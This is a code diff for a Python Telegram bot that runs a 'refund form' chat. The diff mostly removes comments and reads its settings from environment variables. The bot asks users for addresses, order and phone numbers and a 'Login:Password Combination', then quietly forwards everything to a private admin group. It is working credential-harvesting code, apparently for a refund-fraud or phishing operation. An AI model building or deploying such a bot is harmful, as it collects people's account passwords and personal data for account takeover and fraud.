@@ -4,13 +4,9 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters, CallbackQueryHandler
 
 # ================= CONFIGURATION =================
-# 1. Paste your Telegram Bot Token from BotFather here
+# These will be pulled from Railway Environment Variables
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-
-# 2. Create a Telegram Group, add your bot and your co-admin to it. 
-#    Get the Group Chat ID (you can use @userinfobot or @RawDataBot to find it).
-#    It will look like a negative number, e.g., -1001234567890
-ADMIN_GROUP_ID = int(os.getenv("ADMIN_GROUP_ID"))  # <-- CHANGE THIS
+ADMIN_GROUP_ID = int(os.getenv("ADMIN_GROUP_ID"))
 # =================================================
 
 # Enable logging
@@ -28,14 +24,12 @@ QUESTIONS = [
     ("📦 Full address incl. postal code", "Shipping Address"),
     ("💳 Billing Address?", "Billing Address"),
     ("🔢 Whats The Order Number?", "Order Number"),
-    ("🚚 Carrier Tracking Number?", "Carrier Tracking Number"),
     ("📞 Phone Number?", "Phone Number"),
     ("🔐 Login:Password Combination?", "Login:Password Combination")
 ]
 
 # ================= START COMMAND =================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Reset user state
     context.user_data.clear()
     
     welcome_text = (
@@ -61,7 +55,6 @@ async def start_form(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['attempts'] = 5
     context.user_data['in_form'] = True
     
-    # Send the first question
     await send_question(query.message.chat_id, context)
 
 async def send_question(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
@@ -84,7 +77,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     step = context.user_data.get('step', 0)
     
     if step >= len(QUESTIONS):
-        return # Should be handled by buttons
+        return 
         
     # Check if it's a text message
     if not update.message.text:
@@ -144,7 +137,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         data = context.user_data.get('data', {})
         user = query.from_user
         
-        # Build the admin log message
         log_text = (
             f"📥 <b>New Refund Form Submission</b>\n"
             f"Submitted by: @{user.username} (ID: {user.id})\n\n"
@@ -152,19 +144,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for _, key in QUESTIONS:
             log_text += f"<b>{key}:</b> {data.get(key, 'Not provided')}\n"
             
-        # Send to the admin group
         try:
             await context.bot.send_message(chat_id=ADMIN_GROUP_ID, text=log_text, parse_mode="HTML")
         except Exception as e:
             logging.error(f"Failed to send to admin group: {e}")
             
-        # Send final confirmation to user
         await query.edit_message_text(
             text="✅ Thank you! Your order is in progress. You'll be contacted by an admin upon completion.",
             parse_mode="HTML"
         )
         
-        # Clear user data
         context.user_data.clear()
         
     elif query.data == "no_redo":
@@ -187,14 +176,9 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
 if __name__ == '__main__':
     application = ApplicationBuilder().token(BOT_TOKEN).build()
     
-    # Command handlers
     application.add_handler(CommandHandler('start', start))
     application.add_handler(CommandHandler('stop', stop))
-    
-    # Button handler
     application.add_handler(CallbackQueryHandler(button_handler))
-    
-    # Message handler (for form answers)
     application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
     
     print("Bot is running...")
